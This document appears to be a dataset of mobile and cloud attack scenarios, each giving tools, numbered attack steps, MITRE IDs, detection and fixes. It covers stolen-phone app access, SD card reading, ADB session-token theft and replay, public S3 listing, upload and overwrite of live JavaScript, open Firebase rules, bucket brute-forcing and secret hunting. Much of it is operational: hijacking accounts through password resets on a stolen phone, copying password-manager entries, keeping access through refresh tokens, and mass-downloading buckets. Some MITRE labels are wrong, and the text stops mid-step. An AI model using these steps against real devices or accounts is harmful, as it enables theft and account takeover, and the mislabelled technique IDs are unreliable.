Title: No Biometrics = Direct App Access
Attack Type: Stolen Device Attack (App Bypass due to No Biometrics)
Scenario Description: This attack targets Android or iOS phones that do not use biometric authentication (fingerprint or face) to lock individual sensitive apps such as banking apps, email, messaging apps, or password managers. When a phone is lost or stolen, and the screen lock is weak (or the device is already unlocked), the attacker can directly open these apps and access private data because there is no biometric or PIN required at the app level. Many apps support optional biometric locks, but users often skip enabling them, relying only on device screen lock — which, once bypassed or unlocked, exposes everything inside the apps. This leads to complete compromise of personal data, financial details, or even email recovery and social media hijack.
Tools Used: Android or iOS phone (unlocked or already logged in), No tools required (just physical access), Optional: Screen recording app (for evidence), Optional: secondary phone (for screenshots), Note-taking app or email to exfiltrate data
Attack Steps: Step 1: Physically acquire the mobile device (either test device, your own phone, or a demo phone). Ensure it is already unlocked or logged in — for example, taken while left unattended or retrieved before screen auto-lock activates. This simulates a real-world stolen or unattended phone scenario. Step 2: Once you’re on the home screen, open sensitive apps like WhatsApp, Gmail, Instagram, Paytm, PhonePe, banking apps (e.g., SBI YONO, HDFC, ICICI), or apps like LastPass, Google Drive, or Notes. Observe whether the apps open without any biometric or passcode challenge. If so, the app has no app-level biometric enforcement. Step 3: Navigate through the opened app’s interface and start reviewing personal content — messages, emails, transaction history, contact lists, etc. In many banking apps, balance, recent transactions, UPI IDs, and even card details may be visible directly without any second factor. Step 4: Try to initiate a transaction or request OTP. Some apps (like Google Pay, PhonePe) allow requesting money, linking new UPI IDs, or viewing account holders without full authentication. If screen lock is disabled and biometric access is not enforced, you can do this freely. Step 5: Use the “Forgot Password” feature in apps like Gmail, Instagram, Facebook, or others to hijack accounts using email or SMS verification — especially if OTP auto-fill is enabled. Since the app is already open, you may also access stored tokens, saved logins, or direct password reset flows. Step 6: If password manager apps (like LastPass or Bitwarden) are installed without biometric lock, directly access saved website credentials and copy passwords. You can use these to login on other devices later. Step 7: Open apps like Google Chrome or Safari and check for saved passwords under settings → passwords. If the phone allows access without Face ID/Touch ID, you can view stored email logins, social media credentials, and even payment card data. Step 8: Exfiltrate useful data by either taking screenshots, copying to Notes or clipboard, sending emails to another address, or uploading to Google Drive. No technical tools are needed — just open the app and retrieve what’s inside. Step 9: Go to “Settings → Security” in these apps and check if fingerprint/Face ID/PIN is disabled. Most apps have this as an option — but if the user has skipped enabling it, the app remains fully exposed after unlocking the device once. Step 10: Document all the findings — what apps were accessible, what data was visible, and which apps lacked additional biometric/PIN protections. This is useful for security audits and awareness. Step 11: If you want to test mitigation, enable biometrics for each app (if supported), reboot the phone, unlock it, and reopen apps. Now, those apps should prompt for biometric unlock before revealing content. This confirms protection works when configured.
Target Type: Unlocked or unattended Android/iOS smartphones with no app-level biometric protection
Vulnerability: Lack of biometric enforcement in sensitive apps even after device unlock
MITRE Technique: T1412 (Abuse Device Interfaces), T1539 (Access Sensitive Apps), T1621 (Bypass Application Controls)
Impact: Full access to emails, bank data, private chats, UPI IDs, account recovery, saved passwords
Detection Method: Manual access audit, user behavior analysis, forensic logs, app-level analytics
Solution: Enforce in-app biometrics, mandatory biometric/PIN lock for banking/messaging apps, auto-lock after X mins, MDM to enforce app-level policies, educate users on enabling protection
Tags: app-bypass, no-biometric-lock, stolen-device-access, unlocked-phone, session-abuse, privacy-risk

Title: SD Card Access (Android)
Scenario Description: This attack targets Android phones that use a physical SD card to store photos, documents, app backups, WhatsApp media, exported notes, or even sensitive databases. If the device is lost or stolen, the attacker can simply remove the SD card, insert it into another phone or laptop, and read all the files — even if the phone is locked or powered off, because SD cards are not encrypted by default on most Android devices. Many apps (like WhatsApp, backup tools, or custom file managers) allow storing sensitive information on external storage, assuming the user knows the risks — but attackers take advantage of this poor protection to quickly copy and exploit private data.
Tools Used: Android phone with SD card inserted (victim device), SD card reader or Android phone with SD slot (attacker device), Laptop or PC with SD card slot or USB reader, File Explorer (Windows/Mac), Optional: Data recovery tool like Recuva (for deleted files), Optional: Python or Notepad++ (to read text files), Optional: SQLite Browser (for app DB files)
Attack Steps: Step 1: Physically get access to an Android phone that contains an SD card — for example, a stolen, lost, unattended, or test phone. You can check by opening the SIM/SD tray or removing the back cover, depending on the device model. Step 2: Carefully remove the SD card and insert it into another Android phone that has an SD slot or use a USB SD card reader to connect it to your computer. On most laptops, inserting the SD card will automatically mount it like a USB drive. Step 3: Once connected, browse the SD card using File Explorer or any file manager. Navigate through folders such as /WhatsApp/Media/, /DCIM/, /Download/, /Notes/, /App_Backups/, /Documents/, /Pictures/, /Audio/, and /Android/data/<app_package>/files/. Step 4: Look for readable files like .txt, .pdf, .db, .json, .csv, .xml, .jpg, .mp4, etc. These often contain exported notes, chat media, offline backups, and sensitive logs from apps. Open .txt, .json, or .xml files in Notepad or VS Code to extract sensitive data like login history, user credentials, session tokens, or financial logs. Step 5: For SQLite database files (ending in .db), open them using “DB Browser for SQLite” and explore tables. Many Android apps store cached messages, user IDs, UPI handles, or payment history in SD card-accessible databases. Step 6: If any files were deleted, use tools like Recuva (Windows) or PhotoRec (Linux) to scan the SD card and recover deleted photos, notes, or exported data. Attackers use this to find files users thought were deleted. Step 7: Go to the /Android/data/ folder — this contains data stored by apps that use "external" storage access. If apps didn’t encrypt their data (e.g., note apps, voice recorders, image editors), all their files can be read here freely. Step 8: If WhatsApp backups were exported manually to SD card (common in older versions), extract the .crypt files from /WhatsApp/Databases/. These can be decrypted with online tools or scripts (for forensic research). Step 9: Copy the entire SD card contents to another location. Use this data to simulate session replays, extract PII (Personally Identifiable Information), or impersonate users in a lab environment. Step 10: Optional: Search the SD card using keywords like password, secret, login, token, email, pin, or backup to quickly find juicy files. You can use a terminal command or search tool for this. Step 11: Document the data you accessed, the file types involved, and what apps left their data unprotected on the SD card. Many apps carelessly write logs, backups, or exports without encryption, making this a severe risk.
Target Type: Android phones using SD cards (with sensitive app/media data stored externally)
Vulnerability: No encryption of SD card contents; app data and media stored in plaintext on removable storage
MITRE Technique: T1530 (Data from Removable Media), T1552.001 (Unprotected Credentials in Files)
Impact: Full exposure of chats, app backups, documents, media, saved notes, tokens; even deleted files can be recovered
Detection Method: Manual forensic scan of SD card, check app storage permissions, detect app backup exports, device policy audit
Solution: Enforce SD card encryption (if supported), disable external storage use for sensitive apps, educate users, enforce MDM policies, configure apps to store data internally with encryption
Tags: sdcard-leak, media-theft, backup-exposure, external-storage-risk, stolen-phone, android-privacy

Title: Session Token Theft via File Copy
Scenario Description: This attack targets Android or iOS devices where mobile apps store session tokens (auth tokens, cookies, JWTs) in local unprotected files such as SharedPreferences, SQLite databases, or app cache. If a device is lost or stolen and not fully encrypted, an attacker can use tools like ADB (Android) or SSH/Filza (iOS Jailbroken) to copy those files, extract the tokens, and reuse them to access the victim’s account without a password. Tokens are often long-lived and reused silently in API calls. If the app does not bind tokens to device ID, IP, or refresh frequently, stolen tokens can be reused on another phone or system easily.
Tools Used: Android phone (unlocked or with ADB access), Computer with ADB tools, Optional: Rooted phone or emulator, iOS (jailbroken) with SSH or Filza, SQLite DB Browser, JWT.io or Base64 decoder, Text Editor (VS Code / Notepad++), Optional: Postman or cURL for replay
Attack Steps: Step 1: Physically obtain the Android device (test phone, rooted device, or emulator). Ensure the screen is unlocked or that you have USB debugging enabled or root access. Connect the device to your computer using a USB cable. Step 2: Launch terminal or command prompt and type adb devices to confirm the device is connected. Step 3: Use ADB to navigate into the app’s private storage. Type: adb shell, then run-as com.example.app (replace with actual app package). Step 4: Navigate to potential token locations like shared_prefs/, databases/, or cache/. For example, cd /data/data/com.example.app/shared_prefs/. Step 5: List the files with ls. Look for files like auth.xml, session.xml, prefs.xml, or user_data.xml. Use cat filename.xml to view file contents. Step 6: If the file contains something like <string name="access_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string> — this is a JWT token. Copy it. Step 7: Paste the token into https://jwt.io to decode the content and confirm if it has sensitive claims like user_id, email, roles, exp (expiry). If it's not JWT, use a Base64 decoder. Step 8: Try using the token to simulate a login session. Open Postman or terminal. Use an API request like GET https://api.example.com/user/profile and add Authorization: Bearer <token> in the header. If the server accepts it, you now have access as the original user. Step 9: If the token is stored in a .db file, use ADB to pull it: adb pull /data/data/com.example.app/databases/session.db. Open with DB Browser for SQLite, look inside tables for keys like access_token, refresh_token, or user_id. Step 10: On iOS (jailbroken), install Filza or connect via SSH. Go to /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/. Step 11: Look for .plist or .db files. Open them and look for similar token strings. iOS apps that store tokens insecurely will expose user sessions this way. Step 12: Use stolen tokens to access accounts remotely, especially if the app has weak validation (no IP/device check, long token expiry). This simulates how attackers take over accounts without login credentials. Step 13: Document your findings. Check whether tokens expired, how long they last, and whether the app logs you out if token is reused. This reveals token security quality. Step 14: BONUS: If the app stores refresh tokens, you can use those to generate new session tokens and keep access forever unless manually revoked. This is more dangerous than access tokens.
Target Type: Android or iOS apps storing session tokens insecurely
Vulnerability: Unencrypted, persistent session tokens stored in readable files
MITRE Technique: T1552.001 (Credentials in Files), T1412 (Improper Credential Storage)
Impact: Account takeover, impersonation, data theft, session hijack
Detection Method: Detect token reuse from new IPs/devices, analyze storage permissions, audit ADB access logs
Solution: Store tokens in encrypted storage (Keystore / Keychain), expire tokens quickly, bind to device ID, rotate on usage
Tags: session-hijack, adb-dump, stolen-device, plaintext-token, jwt-theft, android-ios-token

Title: Publicly Listable Buckets (ListBucket)
Scenario Description: In this scenario, an organization stores sensitive files (like backups, logs, or code) on Amazon S3 cloud storage. Due to misconfiguration, their S3 bucket allows public listing. This means anyone on the internet can view the list of all files in the bucket, even without logging in or having permission. An attacker can exploit this to find confidential documents or download everything in the bucket.
Tools Used: AWS CLI, S3Scanner, Google Dorking, Cyberduck, curl
Attack Steps: Step: 1. Understand that Amazon S3 is like a public folder on the cloud that can store files. Sometimes, due to wrong settings, people make this folder (bucket) "listable" – meaning anyone can see its contents. 2. To begin, install the AWS CLI tool by visiting https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html and following the steps to install it based on your OS. 3. Once installed, you don’t need AWS credentials to test public buckets. 4. Use a public list of possible bucket names from GitHub (e.g., https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/s3-buckets.txt) to find bucket names to test. 5. Now, try listing the contents of a bucket using the AWS CLI: aws s3 ls s3://example-bucket-name --no-sign-request – Replace "example-bucket-name" with any name from the list. 6. If the bucket is publicly listable, it will show all the files inside. If not, it will return an "Access Denied" or "NoSuchBucket" message. 7. Alternatively, use the S3Scanner tool (https://github.com/sa7mon/S3Scanner): install it using pip install s3scanner, then run s3scanner buckets.txt (where buckets.txt contains bucket names). 8. Another beginner-friendly method is using a browser. Just type this in the URL bar: http://example-bucket-name.s3.amazonaws.com/. If it shows you a list of files, it’s vulnerable. 9. You can also use Google to find such buckets by using this Google dork: site:s3.amazonaws.com intitle:index.of or site:s3.amazonaws.com confidential. This might list publicly visible buckets with files. 10. If you find a bucket with list access, try to download files using this command: aws s3 cp s3://example-bucket-name/filename.ext . --no-sign-request. Replace with actual bucket and file name. 11. Repeat this for other files. You can download the entire bucket recursively using: aws s3 cp s3://example-bucket-name/ . --recursive --no-sign-request. 12. If you want to view the files graphically, install Cyberduck (https://cyberduck.io/), add a new connection for Amazon S3, and disable authentication. Try connecting to the bucket URL. 13. Once downloaded, check if any files contain sensitive data like API keys, passwords, code, logs, customer data, etc. This is a data leak. 14. Do not upload anything or change content; just demonstrate the impact by showing the listing and file access. 15. Document your findings and report to the organization ethically via bug bounty platforms or contact forms.
Vulnerability: Public Read/List ACL or Bucket Policy
MITRE Technique: T1530 - Data from Cloud Storage Object
Impact: Unauthorized access to sensitive files, source code, database backups, PII, financial data, service disruption
Detection Method: CloudTrail logs, S3 Access Logs, AWS Config rules, Security scanner alerts
Solution: Disable public listing, use AWS S3 Block Public Access settings, set fine-grained IAM permissions, enable logging and monitoring, review all bucket policies, use automation to detect and auto-remediate public buckets
Tags: s3, aws, listbucket, cloud misconfig, beginner cloud hacking, cloud pentest, data exposure

Title: Unrestricted Download (Public GET Access)
Scenario Description: In this scenario, an organization uploads private files such as internal documents, invoices, PII, videos, backups, or code to a cloud storage bucket (like Amazon S3, Azure Blob, or GCP bucket) assuming they are secure. However, due to misconfiguration, the files themselves are accessible publicly even if the bucket itself is not listable. This means anyone with a direct link can download the file, just like clicking on a public download link, without logging in or using any credentials. Attackers can brute-force file names, scan GitHub and search engines for file URLs, or find exposed links in websites or JavaScript files and directly download them.
Tools Used: Browser, curl, wget, AWS CLI, Google Dork, GitHub Dork, Cyberduck
Attack Steps: 1. Understand that cloud services like Amazon S3, Azure Blob, or Google Cloud Storage let people upload files to the cloud. These files can be made private or public. Sometimes, people mistakenly make the files public without realizing it. This is like putting your personal files on Google Drive and setting them to “Anyone with the link can view.” 2. Your goal is to find such publicly accessible files (GET access) without needing to log in or have any key. 3. Start with Amazon S3. The URLs of public S3 files usually follow the pattern: https://<bucket-name>.s3.amazonaws.com/<filename> or https://s3.amazonaws.com/<bucket-name>/<filename>. 4. You can search for these files using Google Dorking. Go to Google and type: site:s3.amazonaws.com ext:pdf OR ext:xlsx OR ext:docx — this will show publicly downloadable files stored in S3. Try other file extensions like .zip, .bak, .env, .json, .sql, .log, etc. 5. Another method: Go to GitHub.com and use GitHub dorks to find file links accidentally exposed in code. Search: s3.amazonaws.com or .s3. — developers often leave full URLs hardcoded in source code. Open those links to test if they allow direct file download. 6. Visit one of those links. If the file starts downloading or opens in your browser without asking for login, that file has public GET access. 7. If you want to try with a command line, use curl: curl -O https://bucket-name.s3.amazonaws.com/filename.txt — this will download the file if it's public. Or use wget the same way. 8. You can also use Cyberduck (a GUI app for cloud storage). Install Cyberduck from https://cyberduck.io/. Open it, select “Open Connection,” choose Amazon S3, and try entering the URL directly without credentials. If the file is public, you will be able to download it. 9. Some websites store static files like images, resumes, or internal backups on S3, Azure Blob, or GCP. Check the page source (right-click on the page > View Page Source), then search for keywords like .s3., .blob.core.windows.net, or storage.googleapis.com. Copy these links and open them. If they open without a login, they are publicly downloadable. 10. For Azure Blob Storage, URLs typically look like: https://<account>.blob.core.windows.net/<container>/<file>. Try opening these links directly. If the file downloads, it’s public. Use Google search: site:blob.core.windows.net ext:csv OR ext:json. 11. For GCP, use: https://storage.googleapis.com/<bucket>/<filename> — again, try to open this in browser or via curl. 12. If you want to test multiple known buckets or brute-force common filenames (like backup.zip, database.sql, export.csv, etc.), write a simple script or use a tool like S3Scanner. 13. Check the file contents. Is it sensitive? Look for API keys, passwords, employee data, customer PII, confidential logs, etc. These leaks can be serious. 14. DO NOT upload or modify anything. Just verify you can download and confirm the data exposure. Document it with screenshots and a write-up. 15. Report the issue to the organization through their responsible disclosure program, or via bug bounty platforms like HackerOne or Bugcrowd. You may be eligible for a reward for reporting the public file exposure.
MITRE Technique: T1530 - Data from Cloud Storage Object
Impact: Unauthorized download of sensitive data such as passwords, logs, financial records, personal files, or backups
Detection Method: Cloud Access Logs (S3 logs, Azure Monitor, GCP audit logs), Threat detection tools like Amazon Macie or Azure Defender, Monitoring outbound access logs
Solution: Make all file objects private by default, use bucket policies and access control lists (ACLs) to restrict access, enable logging and alerts for public GET requests, implement automated scanners for public files, train developers on cloud security best practices

Title: Public Upload Access (PUT)
Scenario Description: In this scenario, a cloud storage bucket (such as Amazon S3 or Azure Blob) is misconfigured to allow public write (PUT) access. This means anyone on the internet can upload files to the bucket without authentication. Attackers can exploit this to upload malicious scripts, phishing pages, malware, or fill the bucket with junk to increase the organization’s cloud bill. In some cases, attackers may even host fake login pages using the company's own storage bucket. This attack is especially dangerous when the bucket is linked to a website or public service.
Tools Used: AWS CLI, curl, Burp Suite (optional), S3Scanner, wget, Cyberduck
Attack Steps: 1. Understand that Amazon S3 and similar cloud storage services allow users to upload and manage files using a command called PUT. If a bucket is misconfigured with public PUT access, any person with an internet connection can upload files to it, without logging in. 2. Your goal is to find buckets that allow you to upload files using PUT. Start by installing the AWS CLI tool from https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html. Follow the official steps for Windows, macOS, or Linux. 3. Once installed, you don’t need AWS credentials to test public buckets if the --no-sign-request flag is used. This bypasses the need for an AWS account and is used to access public resources. 4. Create a text file called test.txt using Notepad (Windows) or any editor. Write: This is a test upload. and save the file. 5. Use GitHub’s SecLists (https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/s3-buckets.txt) to get potential S3 bucket names. 6. Choose one bucket name and try uploading your file using this command: aws s3 cp test.txt s3://example-bucket-name/test.txt --no-sign-request — Replace example-bucket-name with the actual bucket name. If the upload works with no error, then the bucket has public upload access! 7. You can also test using curl (if you know the file URL path): curl -T test.txt https://example-bucket.s3.amazonaws.com/test.txt — If it uploads successfully, the PUT request worked. 8. To verify the upload, open the file URL in your browser: https://example-bucket.s3.amazonaws.com/test.txt. If it shows your test content, then the bucket is both publicly writable and readable (dangerous!). 9. Use S3Scanner to automate testing: install with pip install s3scanner, create a file buckets.txt with a list of bucket names, then run s3scanner buckets.txt --upload-file test.txt. It will try uploading to each bucket. 10. If successful, now test uploading a different file such as index.html to see if the bucket can be abused to host phishing pages. Write a basic HTML page with the text: “Fake Login Page” and try uploading: aws s3 cp index.html s3://example-bucket-name/index.html --no-sign-request 11. After upload, open the link: https://example-bucket-name.s3.amazonaws.com/index.html. If it shows your HTML page, then the bucket can be used to host malicious content under the organization’s domain. 12. Advanced check: If the bucket is connected to a domain like cdn.example.com, your uploaded file might be visible at https://cdn.example.com/index.html — this makes phishing and defacement even more dangerous. 13. Attackers may also fill the bucket with large junk files (e.g., 100MB zip files) to exhaust storage quotas and increase billing costs. You can try uploading a few dummy files to test this. 14. You can also try uploading .php, .js, or .bat files to see if the server executes them or serves them as downloads. This tests if Remote Code Execution is possible (usually not, but worth checking). 15. If the bucket supports PUT but not GET (write only), you won’t be able to see your uploaded file, but it still uses storage. 16. Cyberduck (https://cyberduck.io/) is a graphical tool you can use to test PUT access visually. Connect to the bucket using “Anonymous login” and try dragging and dropping files into it. 17. Document all successful uploads: take screenshots, note file names, URLs, and the fact that no login was needed. Also test from incognito/private mode to prove no session was involved. 18. Never upload real malware, viruses, or phishing pages in real life. Just use safe dummy files to prove the risk. 19. If confirmed, report the issue ethically to the organization through bug bounty platforms like HackerOne or Bugcrowd, or contact them via a responsible disclosure form.
Target Type: Cloud Storage Buckets (S3, Azure Blob, GCP)
MITRE Technique: T1530 - Data from Cloud Storage Object
Impact: Allows attackers to upload malware, phishing content, abuse storage space, damage brand reputation, serve malicious files from legitimate domains
Detection Method: Monitor logs for anonymous PUT operations, enable object-level logging, scan for unusual new files or uploads, use CloudTrail (AWS), Azure Monitor, GCP logging
Solution: Disable public write access completely using bucket policies or ACLs, block public access settings in AWS S3, audit all storage containers for permissions, use automated scanners to detect misconfigs, enforce IAM role-based access

Title: Overwriting Existing App Files
Scenario Description: In this scenario, a cloud storage bucket (like Amazon S3 or Azure Blob) is used to host public application files — such as HTML, JavaScript, or CSS — which are directly linked to a website or mobile app. Due to incorrect permissions, an attacker is able to upload (PUT) a file with the same name as an existing legitimate file (e.g., main.js or index.html). This overwrites the original file, leading to defacement, backdooring, phishing, or injecting malicious code into a live application. This can lead to Remote Code Execution (RCE), data theft, session hijacking, or full app compromise.
Tools Used: AWS CLI, curl, Burp Suite, Cyberduck, browser (Chrome), Notepad
Attack Steps: 1. Understand that many websites or web apps store their static files — like index.html, main.js, style.css, images, or downloadable content — on cloud buckets like Amazon S3, Azure Blob, or Google Cloud Storage. If these buckets are not properly secured, someone might be able to overwrite these public-facing files. 2. First, visit a target website and right-click > View Page Source. Look for links like https://bucket-name.s3.amazonaws.com/index.html or cdn.example.com/app.js — these indicate the app is using cloud-hosted static files. Note down the full file URL and filename. 3. Open the public URL of a file like main.js or style.css in your browser. If the file opens and you can view or download it without logging in, it is publicly readable — this is the first hint. 4. Next, check if the bucket allows public PUT (upload) access. Create a test file using Notepad and name it exactly the same as the original file (e.g., main.js). Inside it, write a simple text like: alert("Hacked by test user"); and save the file. 5. Install AWS CLI from https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html and complete setup steps. You don’t need AWS credentials if you use the --no-sign-request flag. 6. Try uploading the modified file to the same location using this command: aws s3 cp main.js s3://example-bucket-name/main.js --no-sign-request — replace the bucket name and file with the correct values you found earlier. 7. If the bucket allows overwriting, this command will silently succeed, and your file will replace the original one. There will be no error message. 8. Now go back to the original file URL (like https://example-bucket.s3.amazonaws.com/main.js) and refresh the page. If you see your new content (e.g., JavaScript alert), that means the overwrite was successful. 9. If the JavaScript file is included in a live app or website, users visiting that site may unknowingly execute your injected code — this could be used for stealing cookies, injecting keyloggers, phishing prompts, or redirecting users. 10. To prove the impact (for security research), replace alert("Hacked") with a harmless message like alert("Security Test - Please fix bucket permissions"). NEVER insert real malware or harmful content. 11. Optionally, you can use Burp Suite to intercept and repeat the PUT request to experiment with file headers, content types, or path traversal. Use it only for research purposes. 12. Cyberduck can be used as a visual interface to overwrite files. Install it, open a connection using Amazon S3 (anonymous mode), drag and drop your test file with the same name as the existing file. If upload works, overwrite was successful. 13. If this bucket is linked to a mobile app, you can decompile the APK file using APKTool and check for hardcoded URLs pointing to S3 or Blob endpoints. Then try uploading files with the same name as the app’s resource files. 14. Advanced: If the overwritten file is a script (.js) or HTML (.html) that loads in the browser, you may be able to inject a fake login page or redirect. This simulates a real phishing attack hosted under the target domain. 15. Document all findings: the original file, the overwritten file, timestamps, affected URL, screenshots of before/after, and proof that no login was required. 16. Always report this ethically through responsible disclosure programs, or platforms like HackerOne, Bugcrowd, or direct email to the security team.

Impact: Attackers can deface the website, insert malicious JavaScript, host phishing pages, run XSS/RCE, or cause user compromise and brand damage
Detection Method: Monitor S3 access logs or Azure/GCP storage logs for PUT operations on existing file paths, detect changes in static content hashes, track anomalies in JS/CSS files via CDN checks
Solution: Lock bucket/object permissions, block public PUT access, use versioning and MFA delete in S3, restrict uploads to backend services only, review all public objects and implement object-level ACLs, scan for script injection

Title: Insecure Firebase Storage Rules Exposure
Scenario Description: A developer creates a Firebase project and configures Cloud Storage for app data (like images, videos, or PDFs). However, they leave the storage rules open to public read/write access (allow read, write: if true;), unintentionally allowing attackers to view, upload, or delete sensitive files without authentication.
Tools Used: Browser, Firebase tools, Firebase URL scanner (e.g., Google Dorking), Curl/Postman (for testing access), GitHub (for dorking open Firebase links)
Attack Steps:
1. Understand the Target: Firebase is used by many Android/web apps. If the developer does not secure the Firebase storage properly, anyone can read/write data without login.2. Look for Firebase Targets: Use Google Dorks to find Firebase URLs. For example, search: site:*.firebaseio.com or inurl:".firebaseio.com/o" in Google to discover public Firebase endpoints. You may also explore GitHub for exposed Firebase links in source code.3. Identify the Firebase Storage Endpoint: Firebase Storage URLs look like this: https://firebasestorage.googleapis.com/v0/b/YOUR-PROJECT-ID.appspot.com/o. You need to find the full URL. Sometimes app traffic (via Burp Suite or browser DevTools) or APK analysis can reveal it.4. Test for Public Access: Open the discovered Firebase Storage URL in your browser. Example: https://firebasestorage.googleapis.com/v0/b/test-project-123.appspot.com/o/sample.pdf?alt=media. If the file opens without login, it means it's publicly accessible.5. Test Directory Listing: Try accessing: https://firebasestorage.googleapis.com/v0/b/test-project-123.appspot.com/o without any file. If you get a JSON listing of all files, public listing is enabled. This is a misconfiguration.6. Check Storage Rules (only possible if you control the Firebase project): Go to Firebase Console > Storage > Rules tab. If you see this rule: allow read, write: if true; — it's insecure. Anyone on the internet can access or modify files.7. Try File Upload (Public Write Test): - Use Curl or Postman to upload a file. - Prepare a sample request using POST method with a test file. - Example curl command: bash
curl -X POST -H "Content-Type: image/png" --data-binary @test.png "https://firebasestorage.googleapis.com/v0/b/test-project-123.appspot.com/o?name=upload.png"
- If the upload succeeds and gives you a download URL, then write permissions are also publicly exposed.8. Attempt File Deletion (Dangerous): You can try sending a DELETE request if you suspect delete permissions are also open (do this only on test projects).9. Exfiltrate Data (View Sensitive Files): If you discover files like /users/ids.pdf or /internal/config.json, download them using direct URLs. This confirms data exposure.10. Take Screenshot & Document (if part of an ethical audit): Always document the misconfiguration for reporting to the owner or bug bounty platform.✅ You have now successfully identified and exploited insecure Firebase Storage rules! Do this ethically and only on apps you own or have permission to test.
Vulnerability: Insecure Public Access to Firebase Storage Rules (allow read, write: if true;)
Impact: Full unauthorized access to sensitive files; attackers can upload malicious content, perform data exfiltration, or disrupt app functionality
Detection Method: Log analysis of file access without auth, alerts on anomalous uploads/downloads
Solution:
✅ Update Firebase Storage rules like:
service firebase.storage {
match /b/{bucket}/o {
match /{allPaths=**} {
allow read, write: if request.auth != null;
}
}
}
✅ Use Firebase App Check✅ Regularly audit permissions

Source: Firebase Security Rules Docs, Bugcrowd Guide

Title: Bucket Brute-forcing & Enumeration
Scenario Description: Developers often create cloud storage buckets (on AWS S3, GCP, Azure) to store files, images, backups, or app content. These buckets are sometimes made public without access controls or given predictable names. Attackers can brute-force or guess bucket names, then check for public access. Once found, attackers can view, download, or upload files, leading to data leaks, malware delivery, or full control over bucket content.
Tools Used: Google (Dorking), AWS CLI, s3scanner, AWSBucketDump, grayhatwarfare.com, buckets.txt, dnstwist, browser
Attack Steps: 1. Understand What a Bucket Is: In AWS, a "bucket" is like a public folder in the cloud. Files (called "objects") are stored inside. If someone forgets to lock it, anyone can access it. Buckets are hosted at URLs like: https://bucket-name.s3.amazonaws.com/.2. Start with Bucket Naming Convention: Buckets are often named after the company, app, project, or website. Example: if a company is acmecorp, the bucket might be acmecorp-logs, acmecorp-media, or acmecorp-backups.3. Create a Wordlist: You need a list of potential bucket names to brute-force. You can: - Use existing lists like SecLists (Discovery/S3/buckets.txt) - Generate permutations using dnstwist acmecorp.com --format list - Manually guess names using company names + words like "backup", "prod", "media", "files", "cdn", etc.4. Use Online Bucket Search (No Setup Needed): - Visit https://buckets.grayhatwarfare.com/ - Search for keywords like acme, prod, cdn, etc. - Check if files are downloadable5. Check Access Manually via Browser: - Open URL: https://bucket-name.s3.amazonaws.com/ - If you see an “Access Denied” page → it’s private. - If you see XML output with <ListBucketResult> or downloadable links → it's public!6. Brute-force with s3scanner: - Install with: pip install s3scanner - Prepare a list: bucket-names.txt - Run: s3scanner --bucket-list bucket-names.txt --threads 10 - It will tell you which buckets are accessible (READ / WRITE)7. Alternative Tool: AWSBucketDump: - GitHub: https://github.com/jordanpotti/AWSBucketDump - Clone repo, install requirements. - Run: python AWSBucketDump.py -l bucket-names.txt -m - This will download any files it finds!8. Explore Buckets Manually: - If you find a valid public bucket, try navigating its folders manually: https://bucket-name.s3.amazonaws.com/foldername/filename.txt - Try guessing folder names like /backup/, /db/, /logs/, /admin/, etc.9. Check for Write Permissions (VERY SENSITIVE): - If the bucket is writeable, you can upload a file. - Use AWS CLI: aws s3 cp test.txt s3://bucket-name/ - If the file appears at https://bucket-name.s3.amazonaws.com/test.txt, the bucket allows public writes — this is dangerous.10. Use Google Dorking to Discover Buckets: - Try dorks like: site:s3.amazonaws.com inurl:"/backup" site:s3.amazonaws.com confidential intitle:"index of" s3.amazonaws.com11. Document and Report: If you find an exposed bucket from a third-party organization, do NOT exploit further. Instead, report it via bug bounty platform or the responsible disclosure email.12. Stay Ethical: Only test buckets you own or those meant for public security research. Always avoid uploading malicious content or deleting files.✅ You have now successfully completed S3 bucket enumeration and brute-force. This skill is used in bug bounties, red teaming, and cloud audits. You can adapt the same to Google Cloud Storage and Azure Blob Storage (using similar URLs and tools).
Target Type: AWS S3 / GCP Storage / Azure Blob
Vulnerability: Predictable / guessable bucket names with no access controls (no auth)
Impact: Exfiltration of sensitive files, uploading malicious files (e.g. malware), impersonation, ransomware via public buckets
Detection Method: AWS CloudTrail (for uploads/downloads), Storage scanner logs, alerting on public object listing
Solution: ✅ Enforce private access control lists (ACLs)✅ Disable anonymous listing and write✅ Use random or UUID-based bucket names✅ Enable logging and monitoring✅ Scan using AWS Trusted Advisor or GCP Security Scanner
Tags: cloud, aws, s3, brute-force, misconfiguration, bucket, hacking, grayhat, pentest, beginner
Source: AWS Bucket Permissions Docs, AWSBucketDump GitHub, Grayhat Warfare

Title: Finding Secrets/Keys in Exposed Files
Scenario Description: Developers often store configuration files, environment files, backups, or logs in cloud storage (like AWS S3, Azure Blob, or GCP buckets). If these files are exposed due to public bucket access, they may contain hardcoded secrets, API keys, JWT tokens, private keys, database credentials, or OAuth tokens. Attackers can search exposed files, scan their contents, and extract secrets to gain access to cloud accounts, databases, internal APIs, or even production servers.
Tools Used: Browser, AWS CLI, s3scanner, gitrob, TruffleHog, grep, strings, GitHub, Postman, Visual Studio Code
Attack Steps:
1. Understand the Goal: Many developers accidentally upload sensitive files into public cloud buckets (like .env, config.json, credentials.txt, .pem keys, etc.). These files might have passwords, secret tokens, API keys, or access credentials. If the bucket is misconfigured (public), attackers can read them and use the secrets.2. Find Public Buckets or Files: - Visit: https://buckets.grayhatwarfare.com - Search for keywords like env, config, secrets, backup, log, or the company name - Click on file links like config.js, settings.json, backup.tar.gz, or prod.env and download them3. Scan Files for Secrets (Visually): - Open the file in a text editor like VS Code or Notepad++ - Look for keywords: AWS_SECRET_ACCESS_KEY, password=, api_key=, Authorization: Bearer, PRIVATE KEY, DB_USER, JWT_SECRET, etc. - Example: env
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
- These are valid AWS access credentials. Anyone who finds them can use AWS CLI to control the cloud account.4. Automated Secret Scanning with TruffleHog: - Install TruffleHog (Python): pip install truffleHog - Run on file or folder: bash
trufflehog file://./downloaded_files/
- It will automatically detect secrets like API keys, JWTs, Slack tokens, Stripe keys, etc.5. Use strings to Extract Hidden Secrets: - If a file is binary or zipped (like .zip, .tar.gz, .db), use: bash
